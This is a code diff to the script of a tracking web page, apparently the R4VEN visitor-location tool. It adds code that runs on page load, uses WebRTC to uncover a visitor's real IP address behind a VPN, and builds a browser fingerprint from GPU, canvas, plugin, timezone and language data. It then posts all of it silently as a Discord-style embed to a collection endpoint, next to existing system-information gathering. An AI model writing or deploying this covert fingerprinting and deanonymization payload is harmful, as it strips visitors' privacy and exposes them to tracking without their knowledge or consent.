@@ -52,7 +52,163 @@
     let datetime = new Date();
     let localtime = String(datetime.toLocaleTimeString());
 
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
+    // Browser Detection Function
+    function detectBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
+        return 'Chrome';
+      } else if (ua.indexOf('Edg') > -1) {
+        return 'Edge';
+      } else if (ua.indexOf('Firefox') > -1) {
+        return 'Firefox';
+      } else if (ua.indexOf('Safari') > -1) {
+        return 'Safari';
+      }
+      return 'Unknown';
+    }
+
+    const detectedBrowser = detectBrowser();
+    const isChromelike = (detectedBrowser === 'Chrome' || detectedBrowser === 'Edge');
+
+    // WebRTC IP Leak Detection (Bypasses VPN)
+    function getWebRTCRealIP() {
+      return new Promise(function(resolve) {
+        var leakedIPs = [];
+        try {
+          var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+            iceServers: []
+          });
+          
+          pc.createDataChannel("");
+          pc.createOffer().then(function(offer) {
+            pc.setLocalDescription(offer);
+          }).catch(function(e) {
+            console.log('WebRTC offer error:', e);
+            resolve(leakedIPs);
+          });
+          
+          pc.onicecandidate = function(ice) {
+            if (!ice || !ice.candidate) return;
+            var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+            var ipAddress = ipRegex.exec(ice.candidate.candidate);
+            if (ipAddress && leakedIPs.indexOf(ipAddress[1]) === -1) {
+              leakedIPs.push(ipAddress[1]);
+            }
+          };
+          
+          setTimeout(function() {
+            try {
+              pc.close();
+            } catch(e) {}
+            resolve(leakedIPs);
+          }, 2000);
+        } catch(e) {
+          console.log('WebRTC error:', e);
+          resolve(leakedIPs);
+        }
+      });
+    }
+
+    // Advanced Device Fingerprinting
+    function generateDeviceFingerprint() {
+      var fingerprint = {
+        screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
+        timezone: new Date().getTimezoneOffset(),
+        languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
+        plugins: [],
+        webgl: 'N/A',
+        canvas: 'N/A',
+        fonts: [],
+        hwConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        maxTouchPoints: navigator.maxTouchPoints,
+        vendor: navigator.vendor
+      };
+      
+      // Get WebGL info
+      try {
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if(gl) {
+          var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if(debugInfo) {
+            fingerprint.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          }
+        }
+      } catch(e) {}
+      
+      // Canvas fingerprinting
+      try {
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.textBaseline = 'alphabetic';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Browser Fingerprint', 2, 15);
+        fingerprint.canvas = canvas.toDataURL().substring(0, 50);
+      } catch(e) {}
+      
+      // Plugin detection
+      try {
+        for(var i = 0; i < navigator.plugins.length; i++) {
+          fingerprint.plugins.push(navigator.plugins[i].name);
+        }
+      } catch(e) {}
+      
+      return fingerprint;
+    }
+
+    // Send WebRTC and Fingerprint data
+    function sendWebRTCAndFingerprint() {
+      getWebRTCRealIP().then(function(ips) {
+        var fingerprint = generateDeviceFingerprint();
+        
+        var webrtcData = "```autohotkey\n";
+        webrtcData += "WebRTC_Leaked_IPs: " + (ips.length > 0 ? ips.join(', ') : 'None detected') + "\n";
+        webrtcData += "VPN_Detected: " + (ips.length > 0 ? 'Possible (Real IP leaked)' : 'Cannot confirm') + "\n";
+        webrtcData += "Screen_Resolution: " + fingerprint.screen + "\n";
+        webrtcData += "Timezone_Offset: " + fingerprint.timezone + "\n";
+        webrtcData += "Languages: " + fingerprint.languages + "\n";
+        webrtcData += "GPU_Info: " + fingerprint.webgl + "\n";
+        webrtcData += "CPU_Cores: " + fingerprint.hwConcurrency + "\n";
+        webrtcData += "Device_Memory: " + (fingerprint.deviceMemory || 'N/A') + " GB\n";
+        webrtcData += "Touch_Points: " + fingerprint.maxTouchPoints + "\n";
+        webrtcData += "Plugins: " + (fingerprint.plugins.length > 0 ? fingerprint.plugins.join(', ') : 'None') + "\n";
+        webrtcData += "```";
+        
+        const request = new XMLHttpRequest();
+        request.open("POST", "/location_update");
+        request.setRequestHeader('Content-type', 'application/json');
+        
+        var myEmbed = {
+          author: {
+            name: "🔍 WebRTC & Device Fingerprint"
+          },
+          title: "Advanced Identification Data",
+          description: webrtcData,
+          color: 16711680,
+          footer: {
+            text: "Real IP leak detection via WebRTC"
+          }
+        }
+        
+        var params = {
+          username: "R4VEN",
+          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+          embeds: [myEmbed]
+        }
+        
+        request.send(JSON.stringify(params));
+      });
+    }
+
+    // Call fingerprinting on page load
+    sendWebRTCAndFingerprint();
+
+    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "\nDetected_Browser: " + detectedBrowser + "```");
 
     const request = new XMLHttpRequest();
     request.open("POST", "/location_update"); //change webhook
